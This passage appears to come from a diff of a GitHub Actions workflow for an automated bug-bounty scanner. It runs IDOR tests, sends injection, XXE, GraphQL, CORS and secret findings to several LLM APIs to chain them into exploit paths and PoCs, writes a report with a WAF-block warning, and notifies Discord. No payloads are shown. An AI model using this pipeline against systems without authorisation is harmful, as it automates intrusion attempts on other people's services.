+              fs={ex.submit(t,tpl,sub,val):(tpl,sub,val) for tpl,sub,val in pts}
+              for f in concurrent.futures.as_completed(fs):
+                  r=f.result()
+                  if r: fnd.append(r)
+          with open(os.path.join(rd,"ai_agent","idor_findings.txt"),"w") as f: f.write("\n".join(fnd) if fnd else "No IDOR findings\n")
+          print(f"✅ IDOR: {len(fnd)} findings")
+          PYEOF
+
+      - name: "🧬 AI Agent Phase 6: Chain Analysis"
+        continue-on-error: true
+        timeout-minutes: 5
+        run: |
+          python3 << 'PYEOF'
+          import json, os, sys, urllib.request, urllib.error, re, time
+          rd="results/"+os.environ.get("TIMESTAMP",""); target=os.environ.get("TARGET","")
+          def call_with_retry(p, prompt, attempts=2, timeout=120, backoff=4):
+              last_err=None
+              for i in range(attempts):
+                  try:
+                      req=urllib.request.Request(p["url"],data=p["body_tpl"](prompt),headers=p["headers"],method="POST")
+                      with urllib.request.urlopen(req,timeout=timeout) as r: return json.loads(r.read())
+                  except Exception as e:
+                      last_err=e
+                      if i < attempts-1: time.sleep(backoff)
+              raise last_err
+          providers=[]
+          if os.environ.get("ANTHROPIC_API_KEY",""): providers.append({"name":"Anthropic","url":"https://api.anthropic.com/v1/messages","headers":{"x-api-key":os.environ["ANTHROPIC_API_KEY"],"anthropic-version":"2023-06-01","content-type":"application/json"},"body_tpl":lambda p:json.dumps({"model":os.environ.get("ANTHROPIC_MODEL_NAME","claude-sonnet-4-20250514"),"max_tokens":4096,"messages":[{"role":"user","content":p}]}).encode(),"extract":lambda r:r["content"][0]["text"]})
+          if os.environ.get("OPENROUTER_API_KEY",""): providers.append({"name":"OpenRouter","url":"https://openrouter.ai/api/v1/chat/completions","headers":{"Authorization":f"Bearer {os.environ['OPENROUTER_API_KEY']}","content-type":"application/json"},"body_tpl":lambda p:json.dumps({"model":os.environ.get("OPENROUTER_MODEL_NAME","anthropic/claude-sonnet-4"),"max_tokens":4096,"messages":[{"role":"user","content":p}]}).encode(),"extract":lambda r:r["choices"][0]["message"]["content"]})
+          if os.environ.get("OPENROUTER_API_KEY",""): providers.append({"name":"OpenRouter (free)","url":"https://openrouter.ai/api/v1/chat/completions","headers":{"Authorization":f"Bearer {os.environ['OPENROUTER_API_KEY']}","content-type":"application/json"},"body_tpl":lambda p:json.dumps({"model":os.environ.get("OPENROUTER_FREE_MODEL_NAME","meta-llama/llama-3.3-70b-instruct:free"),"max_tokens":4096,"messages":[{"role":"user","content":p}]}).encode(),"extract":lambda r:r["choices"][0]["message"]["content"]})
+          if os.environ.get("GROQ_API_KEY",""): providers.append({"name":"Groq","url":"https://api.groq.com/openai/v1/chat/completions","headers":{"Authorization":f"Bearer {os.environ['GROQ_API_KEY']}","content-type":"application/json"},"body_tpl":lambda p:json.dumps({"model":os.environ.get("GROQ_MODEL_NAME","llama3-70b-8192"),"max_tokens":4096,"messages":[{"role":"user","content":p}]}).encode(),"extract":lambda r:r["choices"][0]["message"]["content"]})
+          if os.environ.get("GEMINI_API_KEY",""): providers.append({"name":"Gemini","url":f"https://generativelanguage.googleapis.com/v1beta/models/{os.environ.get('GEMINI_MODEL_NAME','gemini-2.5-flash')}:generateContent?key={os.environ['GEMINI_API_KEY']}","headers":{"content-type":"application/json"},"body_tpl":lambda p:json.dumps({"contents":[{"parts":[{"text":p}]}],"generationConfig":{"maxOutputTokens":4096}}).encode(),"extract":lambda r:r["candidates"][0]["content"]["parts"][0]["text"]})
+          if os.environ.get("OPENAI_API_KEY",""): providers.append({"name":"OpenAI","url":"https://api.openai.com/v1/chat/completions","headers":{"Authorization":f"Bearer {os.environ['OPENAI_API_KEY']}","content-type":"application/json"},"body_tpl":lambda p:json.dumps({"model":os.environ.get("OPENAI_MODEL_NAME","gpt-5.5"),"max_tokens":4096,"messages":[{"role":"user","content":p}]}).encode(),"extract":lambda r:r["choices"][0]["message"]["content"]})
+          def rf(path,cap=2000):
+              try:
+                  with open(os.path.join(rd,path)) as f: return f.read()[:cap]
+              except: return ""
+          inj=rf("ai_agent/injection_findings.json",3000); xxe=rf("ai_agent/xxe_findings.txt"); gql=rf("ai_agent/graphql_findings.txt"); idor=rf("ai_agent/idor_findings.txt"); sens=rf("files/sensitive.txt"); cors=rf("cors/vulnerable.txt")
+          has=any(v.strip() not in ("","No XXE findings","No GraphQL findings","No IDOR findings") for v in [inj,xxe,gql,idor,sens,cors])
+          if not has or not providers:
+              with open(os.path.join(rd,"ai_agent","chained_analysis.json"),"w") as f: json.dump({"message":"No findings to chain-analyze"},f,indent=2)
+              print("ℹ️ No findings - skip"); sys.exit(0)
+          prompt=f"Analyze for {target}:\nINJECTIONS:{inj}\nXXE:{xxe}\nGRAPHQL:{gql}\nIDOR:{idor}\nSENSITIVE:{sens}\nCORS:{cors}\nReturn JSON ONLY (no markdown code fences):{{\"chaining_opportunities\":[{{\"chain\":\"\",\"impact\":\"critical\",\"steps\":[\"\"]}}],\"confirmed_findings\":[{{\"finding\":\"\",\"poc\":\"\",\"impact\":\"\"}}],\"priority_recommendations\":[\"\"]}}"
+          ok=False
+          for p in providers:
+              try:
+                  print(f"  -> {p['name']}...")
+                  res=call_with_retry(p, prompt)
+                  text=p["extract"](res)
+                  text=re.sub(r'^```(?:json)?|```$','',text.strip(),flags=re.MULTILINE).strip()
+                  m=re.search(r'\{.*\}',text,re.DOTALL)
+                  if not m:
+                      print(f"⚠️ {p['name']}: no JSON object found in response"); continue
+                  with open(os.path.join(rd,"ai_agent","chained_analysis.json"),"w") as f: f.write(m.group(0))
+                  print(f"✅ Chain via {p['name']}"); ok=True; break
+              except Exception as e: print(f"⚠️ {p['name']}: {e}"); continue
+          if not ok: print("❌ All providers failed for chain")
+          PYEOF
+
+      - name: "📋 AI Final Security Report"
+        continue-on-error: true
+        timeout-minutes: 8
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          # Figure out how much of the scan traffic actually got through vs got
+          # blocked/challenged by a WAF - a "0 findings" result is meaningless if
+          # most requests never reached the real application in the first place.
+          TOTAL_HOSTS=$(wc -l < "$RD/live/live.json" 2>/dev/null || true); TOTAL_HOSTS=${TOTAL_HOSTS:-0}
+          BLOCKED_HOSTS=$(grep -ciE '"status_code":(403|429)|"title":"(attention required|just a moment|access denied|checking your browser)' "$RD/live/live.json" 2>/dev/null || true); BLOCKED_HOSTS=${BLOCKED_HOSTS:-0}
+          UNRESPONSIVE_COUNT=$(grep -c "found unresponsive" "$RD/logs/nuclei.log" 2>/dev/null || true); UNRESPONSIVE_COUNT=${UNRESPONSIVE_COUNT:-0}
+          BLOCK_PCT=0
+          if [ "$TOTAL_HOSTS" -gt 0 ]; then
+            BLOCK_PCT=$(awk "BEGIN{printf \"%.0f\", ($BLOCKED_HOSTS/$TOTAL_HOSTS)*100}")
+          fi
+          echo "📡 Scan confidence: $BLOCKED_HOSTS/$TOTAL_HOSTS hosts ($BLOCK_PCT%) returned WAF-block/challenge responses; nuclei marked $UNRESPONSIVE_COUNT host(s) unresponsive"
+          export SCAN_BLOCK_PCT="$BLOCK_PCT"
+          export SCAN_BLOCKED_HOSTS="$BLOCKED_HOSTS"
+          export SCAN_TOTAL_HOSTS="$TOTAL_HOSTS"
+          export SCAN_UNRESPONSIVE_COUNT="$UNRESPONSIVE_COUNT"
+          python3 << 'PYEOF'
+          import json, os, sys, urllib.request, urllib.error, re, datetime, time
+          rd="results/"+os.environ.get("TIMESTAMP",""); target=os.environ.get("TARGET","")
+          def call_with_retry(p, prompt, attempts=2, timeout=120, backoff=4):
+              last_err=None
+              for i in range(attempts):
+                  try:
+                      req=urllib.request.Request(p["url"],data=p["body_tpl"](prompt),headers=p["headers"],method="POST")
+                      with urllib.request.urlopen(req,timeout=timeout) as r: return json.loads(r.read())
+                  except Exception as e:
+                      last_err=e
+                      if i < attempts-1: time.sleep(backoff)
+              raise last_err
+          providers=[]
+          if os.environ.get("ANTHROPIC_API_KEY",""): providers.append({"name":"Anthropic","url":"https://api.anthropic.com/v1/messages","headers":{"x-api-key":os.environ["ANTHROPIC_API_KEY"],"anthropic-version":"2023-06-01","content-type":"application/json"},"body_tpl":lambda p:json.dumps({"model":os.environ.get("ANTHROPIC_MODEL_NAME","claude-sonnet-4-20250514"),"max_tokens":8192,"messages":[{"role":"user","content":p}]}).encode(),"extract":lambda r:r["content"][0]["text"]})
+          if os.environ.get("OPENROUTER_API_KEY",""): providers.append({"name":"OpenRouter","url":"https://openrouter.ai/api/v1/chat/completions","headers":{"Authorization":f"Bearer {os.environ['OPENROUTER_API_KEY']}","content-type":"application/json"},"body_tpl":lambda p:json.dumps({"model":os.environ.get("OPENROUTER_MODEL_NAME","anthropic/claude-sonnet-4"),"max_tokens":8192,"messages":[{"role":"user","content":p}]}).encode(),"extract":lambda r:r["choices"][0]["message"]["content"]})
+          if os.environ.get("OPENROUTER_API_KEY",""): providers.append({"name":"OpenRouter (free)","url":"https://openrouter.ai/api/v1/chat/completions","headers":{"Authorization":f"Bearer {os.environ['OPENROUTER_API_KEY']}","content-type":"application/json"},"body_tpl":lambda p:json.dumps({"model":os.environ.get("OPENROUTER_FREE_MODEL_NAME","meta-llama/llama-3.3-70b-instruct:free"),"max_tokens":8192,"messages":[{"role":"user","content":p}]}).encode(),"extract":lambda r:r["choices"][0]["message"]["content"]})
+          if os.environ.get("GROQ_API_KEY",""): providers.append({"name":"Groq","url":"https://api.groq.com/openai/v1/chat/completions","headers":{"Authorization":f"Bearer {os.environ['GROQ_API_KEY']}","content-type":"application/json"},"body_tpl":lambda p:json.dumps({"model":os.environ.get("GROQ_MODEL_NAME","llama3-70b-8192"),"max_tokens":8192,"messages":[{"role":"user","content":p}]}).encode(),"extract":lambda r:r["choices"][0]["message"]["content"]})
+          if os.environ.get("GEMINI_API_KEY",""): providers.append({"name":"Gemini","url":f"https://generativelanguage.googleapis.com/v1beta/models/{os.environ.get('GEMINI_MODEL_NAME','gemini-2.5-flash')}:generateContent?key={os.environ['GEMINI_API_KEY']}","headers":{"content-type":"application/json"},"body_tpl":lambda p:json.dumps({"contents":[{"parts":[{"text":p}]}],"generationConfig":{"maxOutputTokens":8192}}).encode(),"extract":lambda r:r["candidates"][0]["content"]["parts"][0]["text"]})
+          if os.environ.get("OPENAI_API_KEY",""): providers.append({"name":"OpenAI","url":"https://api.openai.com/v1/chat/completions","headers":{"Authorization":f"Bearer {os.environ['OPENAI_API_KEY']}","content-type":"application/json"},"body_tpl":lambda p:json.dumps({"model":os.environ.get("OPENAI_MODEL_NAME","gpt-5.5"),"max_tokens":8192,"messages":[{"role":"user","content":p}]}).encode(),"extract":lambda r:r["choices"][0]["message"]["content"]})
+          def rf(path,cap=3000):
+              try:
+                  with open(os.path.join(rd,path)) as f: return f.read()[:cap]
+              except: return "N/A"
+          inj=rf("ai_agent/injection_findings.json",3000); xxe=rf("ai_agent/xxe_findings.txt"); gql=rf("ai_agent/graphql_findings.txt"); idor=rf("ai_agent/idor_findings.txt"); chain=rf("ai_agent/chained_analysis.json",2000); nuc=rf("nuclei/findings.jsonl",2000); cors=rf("cors/vulnerable.txt"); sens=rf("files/sensitive.txt"); tako=rf("nuclei/takeover.jsonl",1000)
+          core=[inj,xxe,gql,idor,nuc,cors,sens]
+          empty_markers=("N/A","","[]","No XXE findings","No GraphQL findings","No IDOR findings")
+          has=any(v.strip() not in empty_markers for v in core)
+          # This is written regardless of what the AI does or doesn't say, so a high
+          # block-rate warning can never be silently dropped by a provider ignoring
+          # instructions - the previous version relied entirely on the AI including it.
+          block_pct=int(os.environ.get("SCAN_BLOCK_PCT","0") or "0")
+          blocked_hosts=os.environ.get("SCAN_BLOCKED_HOSTS","0")
+          total_hosts=os.environ.get("SCAN_TOTAL_HOSTS","0")
+          unresponsive=os.environ.get("SCAN_UNRESPONSIVE_COUNT","0")
+          disclaimer=""
+          if block_pct >= 30:
+              disclaimer=(f"## ⚠️ Scan Reliability Warning\n\n"
+                          f"**{blocked_hosts}/{total_hosts} hosts ({block_pct}%)** returned a WAF/bot-challenge "
+                          f"response (403, 429, or a Cloudflare/anti-bot challenge page) during recon, and nuclei "
+                          f"marked **{unresponsive} host(s)** unresponsive mid-scan. A significant portion of this "
+                          f"scan's traffic likely never reached the real application. **A clean result below should "
+                          f"NOT be read as \"this target is secure\"** - it may simply mean the scanner was blocked. "
+                          f"Manual verification from a different network/IP is recommended before drawing conclusions.\n\n---\n\n")
+          elif int(total_hosts or "0") > 0:
+              disclaimer=(f"## ✅ Scan Reliability\n\n{blocked_hosts}/{total_hosts} hosts ({block_pct}%) were "
+                          f"blocked/challenged during recon - most traffic reached the real application.\n\n---\n\n")
+          if not has or not providers:
+              rpt=f"# Security Report: {target}\n**{datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}**\n\n{disclaimer}## No Confirmed Vulnerabilities\nClean scan."
+              os.makedirs(os.path.join(rd,"ai"),exist_ok=True)
+              with open(os.path.join(rd,"ai","security_report.md"),"w") as f: f.write(rpt)
+              print("📄 Clean report"); sys.exit(0)
+          prompt=f"""Senior bug bounty hunter writing FINAL report for {target}.
+          INJECTIONS:{inj}|XXE:{xxe}|GRAPHQL:{gql}|IDOR:{idor}|CHAIN:{chain}
+          NUCLEI:{nuc}|CORS:{cors}|SENSITIVE:{sens}|TAKEOVER:{tako}
+          Write professional report: # Executive Summary\n# Findings (ONLY confirmed)\n## [Severity] Title | Type: | URL: | Severity: | Steps: | PoC: | Impact: | Remediation: |\n# Chaining\n# Statistics\n# Top 5 Recommendations"""
+          ok=False
+          for p in providers:
+              try:
+                  print(f"  -> {p['name']}...")
+                  res=call_with_retry(p, prompt)
+                  text=p["extract"](res)
+                  os.makedirs(os.path.join(rd,"ai"),exist_ok=True)
+                  with open(os.path.join(rd,"ai","security_report.md"),"w") as f: f.write(f"# AI Security Report: {target}\n\n{disclaimer}{text}")
+                  print(f"✅ Report ({len(text)} chars) via {p['name']}"); ok=True; break
+              except Exception as e: print(f"⚠️ {p['name']}: {e}"); continue
+          if not ok: print("❌ All providers failed for report")
+          PYEOF
+
+      - name: "🔢 Count Total Findings"
+        id: count_findings
+        if: always()
+        continue-on-error: true
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          # NOTE: "grep -c PATTERN file || echo 0" is broken when there are zero matches:
+          # grep -c still prints "0" to stdout but exits with status 1 (its "no match"
+          # convention), so the "|| echo 0" ALSO fires, producing two lines ("0\n0") and
+          # breaking the arithmetic below. Using "|| true" (prints nothing) plus a
+          # ${VAR:-0} default (only used when the file is genuinely missing) avoids this.
+          INJECT=$(grep -cE '\[(XSS|SSTI|SQLi|LFI|SSRF|Command|Redirect)\]' "$RD/ai_agent/injection_findings.txt" 2>/dev/null || true); INJECT=${INJECT:-0}
+          XXE=$(grep -c '\[XXE\]' "$RD/ai_agent/xxe_findings.txt" 2>/dev/null || true); XXE=${XXE:-0}
+          GQL=$(grep -c '\[GRAPHQL' "$RD/ai_agent/graphql_findings.txt" 2>/dev/null || true); GQL=${GQL:-0}
+          IDOR=$(grep -c '\[IDOR\]' "$RD/ai_agent/idor_findings.txt" 2>/dev/null || true); IDOR=${IDOR:-0}
+          NUCLEI=$(wc -l < "$RD/nuclei/findings.jsonl" 2>/dev/null || true); NUCLEI=${NUCLEI:-0}
+          SENS=$(wc -l < "$RD/files/sensitive.txt" 2>/dev/null || true); SENS=${SENS:-0}
+          CORS=$(wc -l < "$RD/cors/vulnerable.txt" 2>/dev/null || true); CORS=${CORS:-0}
+          TOTAL=$(( INJECT + XXE + GQL + IDOR + NUCLEI + SENS + CORS ))
+          GH=$(wc -l < "$RD/js/github_recon.txt" 2>/dev/null || true); GH=${GH:-0}
+          VH=$(wc -l < "$RD/live/vhosts.txt" 2>/dev/null || true); VH=${VH:-0}
+          BUCKETS=$(wc -l < "$RD/live/cloud_buckets.txt" 2>/dev/null || true); BUCKETS=${BUCKETS:-0}
+          FUZZ=$(wc -l < "$RD/fuzzing/discovered.txt" 2>/dev/null || true); FUZZ=${FUZZ:-0}
+          LEADS=$(( GH + VH + BUCKETS + FUZZ ))
+          echo "finding_count=$TOTAL" >> "$GITHUB_OUTPUT"
+          echo "🔢 Total confirmed findings: $TOTAL"
+          echo "🔎 Additional recon leads for manual review (not confirmed vulns): $LEADS (GitHub:$GH, VHosts:$VH, Buckets:$BUCKETS, Fuzzing:$FUZZ)"
+
+      - name: "📦 Upload Toolchain Artifact"
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: toolchain-${{ env.TIMESTAMP }}
+          path: /tmp/toolbin/
+          retention-days: 7
+          if-no-files-found: ignore
+
+      - name: "📤 Upload Results Artifact"
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: results-${{ env.TIMESTAMP }}-${{ env.TARGET }}
+          path: results/${{ env.TIMESTAMP }}/
+          retention-days: 30
+
+      - name: "📣 Discord Notification"
+        if: ${{ always() && inputs.discord_notify == true && env.DISCORD_WEBHOOK != '' }}
+        continue-on-error: true
+        timeout-minutes: 3
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          SUBS=$(wc -l < "$RD/subdomains/all_subs.txt" 2>/dev/null || true); SUBS=${SUBS:-0}
+          LIVE=$(wc -l < "$RD/live/live.txt" 2>/dev/null || true); LIVE=${LIVE:-0}
+          INJECT=$(grep -cE '\[(XSS|SSTI|SQLi|LFI|SSRF|Command|Redirect)\]' "$RD/ai_agent/injection_findings.txt" 2>/dev/null || true); INJECT=${INJECT:-0}
+          XXE=$(grep -c '\[XXE\]' "$RD/ai_agent/xxe_findings.txt" 2>/dev/null || true); XXE=${XXE:-0}
+          GQL=$(grep -c '\[GRAPHQL' "$RD/ai_agent/graphql_findings.txt" 2>/dev/null || true); GQL=${GQL:-0}
+          IDOR=$(grep -c '\[IDOR\]' "$RD/ai_agent/idor_findings.txt" 2>/dev/null || true); IDOR=${IDOR:-0}
+          NUCLEI=$(wc -l < "$RD/nuclei/findings.jsonl" 2>/dev/null || true); NUCLEI=${NUCLEI:-0}
+          SENS=$(wc -l < "$RD/files/sensitive.txt" 2>/dev/null || true); SENS=${SENS:-0}
+          CORS=$(wc -l < "$RD/cors/vulnerable.txt" 2>/dev/null || true); CORS=${CORS:-0}
+          TOTAL_AGENT=$(( INJECT + XXE + GQL + IDOR ))
+
+          COLOR=5814783; TITLE="✅ Scan Complete"
+          if [ "$TOTAL_AGENT" -gt 0 ] || [ "$SENS" -gt 0 ] || [ "$CORS" -gt 0 ]; then
+            COLOR=15158332; TITLE="🚨 Vulnerabilities Found"
+          elif [ "$NUCLEI" -gt 5 ]; then
+            COLOR=16744192; TITLE="🔶 Findings Require Review"
+          fi
+
+          jq -n \
+            --arg t "${{ env.TARGET }}" \
+            --arg title "$TITLE" \
+            --arg subs "$SUBS" \
+            --arg live "$LIVE" \
+            --arg inject "$INJECT" \
+            --arg xxe "$XXE" \
+            --arg gql "$GQL" \
+            --arg idor "$IDOR" \
+            --arg nuclei "$NUCLEI" \
+            --arg sens "$SENS" \
+            --arg cors "$CORS" \
+            --arg run "${{ github.run_number }}" \
+            --arg url "https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}" \
+            --argjson color "$COLOR" \
+          '{
+            username:"🎯 BugHunter AI",
+            embeds:[{
+              title:($title+": "+$t), color:$color, url:$url,
+              fields:[
+                {name:"🌐 Recon", value:("Subs: **"+$subs+"** | Live: **"+$live+"**"), inline:false},
+                {name:"🧠 AI Agent", value:("Injections: **"+$inject+"** | XXE: **"+$xxe+"** | GraphQL: **"+$gql+"** | IDOR: **"+$idor+"**"), inline:false},
+                {name:"🔓 Scanner", value:("Nuclei: **"+$nuclei+"** | Secrets: **"+$sens+"** | CORS: **"+$cors+"**"), inline:false},
+                {name:"🔗 Results", value:("[View Run]("+$url+")"), inline:true}
+              ],
+              footer:{text:("Run #"+$run+" | Mode: ${{ env.HUNTING_MODE }} | AI Autonomous Hunter")}
+            }]
+          }' | curl -s -X POST "${{ env.DISCORD_WEBHOOK }}" -H "Content-Type: application/json" -d @- || true
